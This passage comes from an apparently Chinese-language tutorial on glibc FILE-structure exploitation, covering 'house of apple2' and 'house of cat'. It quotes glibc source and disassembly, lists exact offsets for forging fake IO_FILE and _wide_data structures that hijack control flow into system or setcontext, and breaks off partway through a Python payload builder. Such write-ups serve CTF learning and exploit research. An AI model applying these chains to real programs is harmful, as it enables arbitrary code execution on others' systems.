</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_buf_end;        <span style="color:#6272a4">/* End of reserve area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* The following fields are used to support backing up and undo. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_save_base;    <span style="color:#6272a4">/* Pointer to start of non-current get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_backup_base;    <span style="color:#6272a4">/* Pointer to first valid character of
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">                   backup area */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_save_end;    <span style="color:#6272a4">/* Pointer to end of non-current get area. */</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  __mbstate_t _IO_state;
</span></span><span style="display:flex;"><span>  __mbstate_t _IO_last_state;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IO_codecvt</span> _codecvt;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> _shortbuf[<span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IO_jump_t</span> <span style="color:#ff79c6">*</span>_wide_vtable;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>假设劫持了vtable 到 <code>IO_wdata_jumps</code> 之后，调用overflow</p>
<ul>
<li>因为是宏展开，进入 <code>_IO_wfile_jumps</code> 的 overflow 函数。</li>
<li>而这个函数执行流如下</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>wint_t <span style="color:#50fa7b">_IO_wfile_overflow</span>(FILE <span style="color:#ff79c6">*</span>f, wint_t wch) {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_NO_WRITES) <span style="color:#6272a4">/* SET ERROR */</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>    __set_errno(EBADF);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> WEOF;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* If currently reading or no buffer allocated. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ((f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span>
</span></span><span style="display:flex;"><span>      f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/* Allocate a buffer if needed. */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>      _IO_wdoallocbuf(f);
</span></span><span style="display:flex;"><span>      _IO_free_wbackup_area(f);
</span></span><span style="display:flex;"><span>      _IO_wsetg(f, f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_buf_base,
</span></span><span style="display:flex;"><span>                f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
</span></span><span style="display:flex;"><span>        _IO_doallocbuf(f);
</span></span><span style="display:flex;"><span>        _IO_setg(f, f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* Otherwise must be currently reading.  If _IO_read_ptr
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         (and hence also _IO_read_end) is at the buffer end,
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         logically slide the buffer forwards one block (by setting
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         the read pointers to all point at the beginning of the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         block).  This makes room for subsequent output.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         Otherwise, set the read pointers to _IO_read_end (leaving
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         that alone, so it can continue to correspond to the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         external position). */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">==</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_buf_end) {
</span></span><span style="display:flex;"><span>        f<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>        f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>            f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_buf_end;
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_end;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_buf_end;
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_end;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_CURRENTLY_PUTTING;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINE_BUF <span style="color:#ff79c6">|</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>      f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (wch <span style="color:#ff79c6">==</span> WEOF) <span style="color:#ff79c6">return</span> _IO_do_flush(f);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">==</span> f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_buf_end)
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/* Buffer is really full */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (_IO_do_flush(f) <span style="color:#ff79c6">==</span> EOF) <span style="color:#ff79c6">return</span> WEOF;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>f<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> wch;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ((f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_UNBUFFERED) <span style="color:#ff79c6">||</span>
</span></span><span style="display:flex;"><span>      ((f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_LINE_BUF) <span style="color:#ff79c6">&amp;&amp;</span> wch <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#39;\n&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (_IO_do_flush(f) <span style="color:#ff79c6">==</span> EOF) <span style="color:#ff79c6">return</span> WEOF;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> wch;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>libc_hidden_def(_IO_wfile_overflow)
</span></span></code></pre></div><p>主要看其中的函数调用，这里主要看作者的几条连</p>
<p>链1：<code>_IO_wfile_overflow</code> 控制函数执行流，但是需要绕过某些检查。伪造fp</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code>，比如说C为system函数</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_IO_wfile_overflow
</span></span><span style="display:flex;"><span>    _IO_wdoallocbuf
</span></span><span style="display:flex;"><span>        _IO_WDOALLOCATE
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>(fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_wide_vtable <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x68</span>)(fp)
</span></span></code></pre></div><p>链2：<code>_IO_wfile_underflow_mmap</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_IO_wfile_underflow_mmap
</span></span><span style="display:flex;"><span>    _IO_wdoallocbuf
</span></span><span style="display:flex;"><span>        _IO_WDOALLOCATE
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>(fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_wide_vtable <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x68</span>)(fp)
</span></span></code></pre></div><p>链3：<code>_IO_wdefault_xsgetn</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_IO_wdefault_xsgetn
</span></span><span style="display:flex;"><span>    __wunderflow
</span></span><span style="display:flex;"><span>        _IO_switch_to_wget_mode
</span></span><span style="display:flex;"><span>            _IO_WOVERFLOW
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">*</span>(fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_wide_vtable <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x18</span>)(fp)
</span></span></code></pre></div><p>总结一下：使用 <code>largebin attack</code> 劫持<code>_IO_list_all</code> 变量</p>
<ul>
<li>将其替换为一个伪造的 <code>IO_FILE</code> 结构体（某个我们可控内容的堆）</li>
<li>IO_FILE的 <code>_wide_data</code> 伪造为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>IO_FILE的 <code>vtable</code> 伪造为 <code>_IO_wfile_jumps</code>，这是一个 const 变量, gdb使用<code>p &amp;_IO_wfile_jumps</code>查看</li>
<li>在需要写shellcode时，将C设置为一个写满ROP的堆地址就行。常使用setcontext</li>
</ul>
<h2 id="house-of-cat">house of cat</h2>
<p>函数调用链</p>
<ul>
<li><code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数中来攻击</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>__malloc_assert
</span></span><span style="display:flex;"><span>	​__fxprintf
</span></span><span style="display:flex;"><span>		​locked_vfxprintf
</span></span><span style="display:flex;"><span>			__vfprintf_internal #在这里是跳转到IO_validate_vtable通过vtable<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x38</span>调用的下面函数
</span></span><span style="display:flex;"><span>				​_IO_wfile_seekoff
</span></span><span style="display:flex;"><span>					_IO_switch_to_wget_mode
</span></span><span style="display:flex;"><span>						​call qword ptr [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x18</span>] #rax是伪造的io_file的地址
</span></span></code></pre></div><p>并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<code>_IO_wfile_seekoff</code>即可（通常是结合<code>__malloc_assert</code>，改vtable为<code>_IO_wfile_jumps+0x10</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>off64_t
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">_IO_wfile_seekoff</span> (FILE <span style="color:#ff79c6">*</span>fp, off64_t offset, <span style="color:#8be9fd">int</span> dir, <span style="color:#8be9fd">int</span> mode)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  off64_t result;
</span></span><span style="display:flex;"><span>  off64_t delta, new_offset;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">int</span> count;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (mode <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> do_ftell_wide (fp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> must_be_exact <span style="color:#ff79c6">=</span> ((fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_base
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">==</span> fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_read_end)
</span></span><span style="display:flex;"><span>		       <span style="color:#ff79c6">&amp;&amp;</span> (fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_base
</span></span><span style="display:flex;"><span>			   <span style="color:#ff79c6">==</span> fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">bool</span> was_writing <span style="color:#ff79c6">=</span> ((fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr
</span></span><span style="display:flex;"><span>		       <span style="color:#ff79c6">&gt;</span> fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>		      <span style="color:#ff79c6">||</span> _IO_in_put_mode (fp));
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (was_writing <span style="color:#ff79c6">&amp;&amp;</span> _IO_switch_to_wget_mode (fp))   <span style="color:#6272a4">// xxxx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">return</span> WEOF;
</span></span><span style="display:flex;"><span>    ......
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>libc_hidden_def (_IO_wfile_seekoff)
</span></span></code></pre></div><p>在这里调用 <code>_wide_data</code> 里的 <code>vtable的_overflow</code>，JUMP宏 且没有检查</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">_IO_switch_to_wget_mode</span> (FILE <span style="color:#ff79c6">*</span>fp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">&gt;</span> fp<span style="color:#ff79c6">-&gt;</span>_wide_data<span style="color:#ff79c6">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ((wint_t)_IO_WOVERFLOW (fp, WEOF) <span style="color:#ff79c6">==</span> WEOF)
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> EOF;
</span></span><span style="display:flex;"><span>    ......
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>libc_hidden_def (_IO_switch_to_wget_mode)
</span></span></code></pre></div><p>在<code>_IO_switch_to_wget_mode</code> 调试时发现如下的汇编代码</p>
<ul>
<li>rdi 是 fp 指针，是我们可以伪造的一个 IO_FILE。</li>
<li>通过 rdi控制 rax，在通过rax控制rdx，也可以过jbe指令。从而最后call 我们指定的shellcode</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span> <span style="color:#bd93f9">0x7f4cae745d30</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">&gt;</span>       endbr64
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d34</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">&gt;</span>     mov    rax, qword ptr [rdi <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xa0</span>]
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d3b</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">&gt;</span>    push   rbx
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d3c</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">12</span><span style="color:#ff79c6">&gt;</span>    mov    rbx, rdi
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d3f</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">15</span><span style="color:#ff79c6">&gt;</span>    mov    rdx, qword ptr [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x20</span>]
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d43</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">19</span><span style="color:#ff79c6">&gt;</span>    cmp    rdx, qword ptr [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x18</span>]
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d47</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">23</span><span style="color:#ff79c6">&gt;</span>    jbe    _IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">56</span>                <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">56</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d49</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">25</span><span style="color:#ff79c6">&gt;</span>    mov    rax, qword ptr [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xe0</span>]
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d50</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">32</span><span style="color:#ff79c6">&gt;</span>    mov    esi, <span style="color:#bd93f9">0xffffffff</span>
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x7f4cae745d55</span> <span style="color:#ff79c6">&lt;</span>_IO_switch_to_wget_mode<span style="color:#ff79c6">+</span><span style="color:#bd93f9">37</span><span style="color:#ff79c6">&gt;</span>    call   qword ptr [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x18</span>]
</span></span></code></pre></div><p>所以最后的伪造如下</p>
<ul>
<li>rax1 为上面的rax</li>
<li>rax2 为下面的rax寄存器</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fake_io_addr <span style="color:#ff79c6">=</span> heapbase<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xb00</span>                        <span style="color:#6272a4"># 伪造的fake_IO结构体的地址</span>
</span></span><span style="display:flex;"><span>next_chain <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">=</span> p64(rdi)                              <span style="color:#6272a4"># _flags=rdi</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">7</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">2</span>)                        <span style="color:#6272a4"># rcx!=0(FSOP)</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(fake_io_addr<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xb0</span>)               <span style="color:#6272a4"># _IO_backup_base=rdx</span>
</span></span><span style="display:flex;"><span>fake_IO_FILE <span style="color:#ff79c6">+=</span> p64(call_addr)                       <span style="color:#6272a4"># _IO_save_end=call addr(call setcontext/system)</span>
